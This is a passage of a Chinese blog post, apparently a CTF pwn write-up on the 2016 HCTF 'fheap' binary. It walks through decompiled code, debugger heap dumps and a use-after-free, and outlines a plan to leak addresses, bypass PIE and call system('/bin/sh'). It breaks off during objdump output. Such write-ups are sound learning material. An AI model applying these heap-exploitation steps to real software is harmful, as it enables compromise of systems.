@@ -1,0 +1,954 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="Chinese">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222"/>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2"/>
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.0"/>
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/2.png?v=7.1.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/2.png?v=7.1.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.0" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.1.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="前言前几天学了use after free，对fastbin机制有了一定的了解。结合其他知识详细解析一下跟uaf有关的一道题。 1234题目来源：2016 HCTF fheap下载地址：https://github.com/zh-explorer/hctf2016-fheap知识点：UAF、格式化字符串技巧：PIE的绕过 程序静态分析还是那句话，任何漏洞的利用都要回到程序本身。 程序提供两项功能，">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PWN学习之UAF">
+<meta property="og:url" content="https://j-kangel.github.io/2019/09/01/PWN学习之UAF/index.html">
+<meta property="og:site_name" content="KANGEL">
+<meta property="og:description" content="前言前几天学了use after free，对fastbin机制有了一定的了解。结合其他知识详细解析一下跟uaf有关的一道题。 1234题目来源：2016 HCTF fheap下载地址：https://github.com/zh-explorer/hctf2016-fheap知识点：UAF、格式化字符串技巧：PIE的绕过 程序静态分析还是那句话，任何漏洞的利用都要回到程序本身。 程序提供两项功能，">
+<meta property="og:locale" content="Chinese">
+<meta property="og:updated_time" content="2019-08-31T14:04:33.868Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="PWN学习之UAF">
+<meta name="twitter:description" content="前言前几天学了use after free，对fastbin机制有了一定的了解。结合其他知识详细解析一下跟uaf有关的一道题。 1234题目来源：2016 HCTF fheap下载地址：https://github.com/zh-explorer/hctf2016-fheap知识点：UAF、格式化字符串技巧：PIE的绕过 程序静态分析还是那句话，任何漏洞的利用都要回到程序本身。 程序提供两项功能，">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="KANGEL" type="application/atom+xml"/>
+
+
+
+  
+  
+  <link rel="canonical" href="https://j-kangel.github.io/2019/09/01/PWN学习之UAF/"/>
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>PWN学习之UAF | KANGEL</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="Chinese">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+<a href="https://github.com/J-KANGEL" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">KANGEL</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br/>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br/>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br/>Categories</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br/>Archives</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://j-kangel.github.io/2019/09/01/PWN学习之UAF/"/>
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="kangel"/>
+      <meta itemprop="description" content="Life is beautiful!"/>
+      <meta itemprop="image" content="/images/0.jpg"/>
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="KANGEL"/>
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">PWN学习之UAF
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-08-31 16:41:09 / Modified: 14:04:33" itemprop="dateCreated datePublished" datetime="2019-08-31T16:41:09Z">2019-08-31</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/pwn学习/" itemprop="url" rel="index"><span itemprop="name">pwn学习</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>前几天学了use after free，对fastbin机制有了一定的了解。结合其他知识详细解析一下跟uaf有关的一道题。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">题目来源：2016 HCTF fheap</span><br><span class="line">下载地址：https://github.com/zh-explorer/hctf2016-fheap</span><br><span class="line">知识点：UAF、格式化字符串</span><br><span class="line">技巧：PIE的绕过</span><br></pre></td></tr></table></figure>
+<h4 id="程序静态分析"><a href="#程序静态分析" class="headerlink" title="程序静态分析"></a>程序静态分析</h4><p>还是那句话，任何漏洞的利用都要回到程序本身。</p>
+<p>程序提供两项功能，create string和delete string</p>
+<p>create函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">ptr = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);   <span class="comment">//申请0x20大小的堆空间作为索引，free之后为fastbin</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Pls give string size:"</span>);</span><br><span class="line">nbytes = sub_B65();</span><br><span class="line"><span class="keyword">if</span> ( nbytes &lt;= <span class="number">0x1000</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"str:"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( read(<span class="number">0</span>, &amp;buf, nbytes) == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"got elf!!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  nbytesa = <span class="built_in">strlen</span>(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( nbytesa &gt; <span class="number">0xF</span> )        <span class="comment">//str长度大于0xf则申请大小为str长度的堆空间进行存储</span></span><br><span class="line">  &#123;</span><br><span class="line">    dest = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(nbytesa);</span><br><span class="line">    <span class="keyword">if</span> ( !dest )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"malloc faild!"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strncpy</span>(dest, &amp;buf, nbytesa);</span><br><span class="line">    *(_QWORD *)ptr = dest;            </span><br><span class="line">    *((_QWORD *)ptr + <span class="number">3</span>) = sub_D6C;   <span class="comment">//存储调用free函数的地址,free以上申请的两个堆</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strncpy</span>(ptr, &amp;buf, nbytesa);</span><br><span class="line">    *((_QWORD *)ptr + <span class="number">3</span>) = sub_D52;  <span class="comment">//存储调用free函数的地址，free以上申请的一个堆</span></span><br><span class="line">  &#125;</span><br><span class="line">  *((_DWORD *)ptr + <span class="number">4</span>) = nbytesa;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*((_DWORD *)&amp;unk_2020C0 + <span class="number">4</span> * i) )</span><br><span class="line">    &#123;</span><br><span class="line">      *((_DWORD *)&amp;unk_2020C0 + <span class="number">4</span> * i) = <span class="number">1</span>;   <span class="comment">//是否有string</span></span><br><span class="line">      *((_QWORD *)&amp;unk_2020C0 + <span class="number">2</span> * i + <span class="number">1</span>) = ptr;   <span class="comment">//索引堆地址</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"The string id is %d\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">16</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"The string list is full"</span>);</span><br><span class="line">    (*((<span class="keyword">void</span> (__fastcall **)(<span class="keyword">char</span> *))ptr + <span class="number">3</span>))(ptr);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Invalid size"</span>);</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>delete函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"Pls give me the string id you want to delete\nid:"</span>);</span><br><span class="line">  v1 = sub_B65();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">16</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid id"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *((_QWORD *)&amp;unk_2020C0 + <span class="number">2</span> * v1 + <span class="number">1</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Are you sure?:"</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;buf, <span class="string">"yes"</span>, <span class="number">3u</span>LL) )</span><br><span class="line">    &#123;</span><br><span class="line">      (*(<span class="keyword">void</span> (__fastcall **)(_QWORD, <span class="keyword">const</span> <span class="keyword">char</span> *))(*((_QWORD *)&amp;unk_2020C0 + <span class="number">2</span> * v1 + <span class="number">1</span>) + <span class="number">24L</span>L))(</span><br><span class="line">        *((_QWORD *)&amp;unk_2020C0 + <span class="number">2</span> * v1 + <span class="number">1</span>),</span><br><span class="line">        <span class="string">"yes"</span>);</span><br><span class="line">      *((_DWORD *)&amp;unk_2020C0 + <span class="number">4</span> * v1) = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到，delete的时候并未判断string是否存在，free之后并没有将改地址设为NULL。因此有很明显的double free漏洞。</p>
+<h4 id="程序动态分析"><a href="#程序动态分析" class="headerlink" title="程序动态分析"></a>程序动态分析</h4><p>checksec</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gef➤  checksec</span><br><span class="line">[+] checksec <span class="keyword">for</span> <span class="string">'/mnt/hgfs/shared/2016HCTF fheap/fheap'</span></span><br><span class="line">Canary                        : Yes</span><br><span class="line">NX                            : Yes</span><br><span class="line">PIE                           : Yes</span><br><span class="line">Fortify                       : No</span><br><span class="line">RelRO                         : Partial</span><br></pre></td></tr></table></figure>
+<p>首先create两个&lt;=0xf的string，查看堆空间</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">gef➤  vmmap</span><br><span class="line">Start              End                Offset             Perm Path</span><br><span class="line">0x0000555555554000 0x0000555555556000 0x0000000000000000 r-x /mnt/hgfs/shared/2016HCTF fheap/fheap</span><br><span class="line">0x0000555555755000 0x0000555555756000 0x0000000000001000 r-- /mnt/hgfs/shared/2016HCTF fheap/fheap</span><br><span class="line">0x0000555555756000 0x0000555555757000 0x0000000000002000 rw- /mnt/hgfs/shared/2016HCTF fheap/fheap     <span class="comment">#可读写段</span></span><br><span class="line">0x0000555555757000 0x0000555555778000 0x0000000000000000 rw- [heap]  <span class="comment">#堆起始地址</span></span><br><span class="line">0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- </span><br><span class="line">0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7fda000 0x00007ffff7fdd000 0x0000000000000000 rw- </span><br><span class="line">0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]</span><br><span class="line">0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]</span><br><span class="line">0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- </span><br><span class="line">0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]</span><br><span class="line">gef➤  x /20gx 0x0000555555757000</span><br><span class="line">0x555555757000:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x555555757010:	0x0000000a61616161	0x0000000000000000  <span class="comment">#chunk1</span></span><br><span class="line">0x555555757020:	0x0000000000000005	0x0000555555554d52</span><br><span class="line">0x555555757030:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x555555757040:	0x0000000a62626262	0x0000000000000000  <span class="comment">#chunk2</span></span><br><span class="line">0x555555757050:	0x0000000000000005	0x0000555555554d52</span><br><span class="line">0x555555757060:	0x0000000000000000	0x0000000000020fa1</span><br><span class="line">0x555555757070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555757080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555757090:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+<p>先delete chunk1，再delete chunk0，查看堆空间以及fastbins</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x /20gx 0x0000555555757000</span><br><span class="line">0x555555757000:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x555555757010:	0x0000555555757030	0x0000000000000000</span><br><span class="line">0x555555757020:	0x0000000000000005	0x0000555555554d52</span><br><span class="line">0x555555757030:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x555555757040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555757050:	0x0000000000000005	0x0000555555554d52</span><br><span class="line">0x555555757060:	0x0000000000000000	0x0000000000020fa1</span><br><span class="line">0x555555757070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555757080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555757090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">gef➤  heap bins</span><br><span class="line">[+] No Tcache <span class="keyword">in</span> this version of libc</span><br><span class="line">─────────────────────────────────────────── Fastbins <span class="keyword">for</span> arena 0x7ffff7dd1b20 ───────────────────────────────────────────</span><br><span class="line">Fastbins[idx=0, size=0x10] 0x00</span><br><span class="line">Fastbins[idx=1, size=0x20]  ←  Chunk(addr=0x555555757010, size=0x30, flags=PREV_INUSE)  ←  Chunk(addr=0x555555757040, size=0x30, flags=PREV_INUSE) </span><br><span class="line">Fastbins[idx=2, size=0x30] 0x00</span><br><span class="line">Fastbins[idx=3, size=0x40] 0x00</span><br><span class="line">Fastbins[idx=4, size=0x50] 0x00</span><br><span class="line">Fastbins[idx=5, size=0x60] 0x00</span><br><span class="line">Fastbins[idx=6, size=0x70] 0x00</span><br></pre></td></tr></table></figure>
+<p>下面查看string list（unk_2020C0 ）的内容。string list在.bss段，该段为可读写段，可读写段从plt表开始。由上面的vmmap可知可读写段地址为<code>0x0000555555756000</code>，ida中查看偏移</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.got.plt:0000000000202000                 dq offset stru_201DF0</span><br><span class="line">.got.plt:0000000000202008 qword_202008    dq 0                    ; DATA XREF: sub_950↑r</span><br><span class="line">.got.plt:0000000000202010 qword_202010    dq 0                    ; DATA XREF: sub_950+6↑r</span><br><span class="line">.got.plt:0000000000202018 off_202018      dq offset free          ; DATA XREF: _free↑r</span><br><span class="line">.got.plt:0000000000202020 off_202020      dq offset strncpy       ; DATA XREF: _strncpy↑r</span><br><span class="line">...</span><br><span class="line">.bss:00000000002020C0 unk_2020C0      db    ? ;               ; DATA XREF: sub_D95:loc_DE9↑o</span><br><span class="line">.bss:00000000002020C0                                         ; sub_D95+C1↑o ...</span><br></pre></td></tr></table></figure>
+<p>偏移为0xc0，因此string list的地址为<code>0x00005555557560c0</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x /10gx 0x00005555557560c0</span><br><span class="line">0x5555557560c0:	0x0000000000000000	0x0000555555757010</span><br><span class="line">0x5555557560d0:	0x0000000000000000	0x0000555555757040</span><br><span class="line">0x5555557560e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555557560f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555756100:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+<p>可以看到free后的堆地址仍然存在。</p>
+<p>接着create大小为0x20的string，查看堆空间</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x /20gx 0x0000555555757000</span><br><span class="line">0x555555757000:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x555555757010:	0x0000555555757040	0x0000000000000000</span><br><span class="line">0x555555757020:	0x0000000000000020	0x0000555555554d6c</span><br><span class="line">0x555555757030:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x555555757040:	0x3131313131313131	0x3232323232323232</span><br><span class="line">0x555555757050:	0x3333333333333333	0x3434343434343434</span><br><span class="line">0x555555757060:	0x0000000000000000	0x0000000000020fa1</span><br><span class="line">0x555555757070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555757080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555757090:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+<p>发现了uaf漏洞。</p>
+<p>利用思路如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">根据调用free函数的地址找到puts函数地址</span><br><span class="line">puts函数泄漏程序基地址</span><br><span class="line">根据程序基地址找到printf函数地址</span><br><span class="line">利用printf的fmt漏洞泄漏libc基地址</span><br><span class="line">根据libc基地址找到system函数地址</span><br><span class="line">调用system(&quot;/bin/sh&quot;)</span><br></pre></td></tr></table></figure>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>第一步：根据调用free函数的地址找到puts函数地址</p>
+<p>查看puts函数在程序中的偏移</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">➜ objdump -d -M intel fheap | grep puts</span><br><span class="line">0000000000000990 &lt;puts@plt&gt;:</span><br><span class="line">     c54:	e8 37 fd ff ff       	call   990 &lt;puts@plt&gt;</span><br><span class="line">     c60:	e8 2b fd ff ff       	call   990 &lt;puts@plt&gt;</span><br><span class="line">     c6c:	e8 1f fd ff ff       	call   990 &lt;puts@plt&gt;</span><br><span class="line">     d1a:	e8 71 <span class="built_in">fc</span> ff ff       	call   990 &lt;puts@plt&gt;</span><br><span class="line">     d2d:	e8 5e 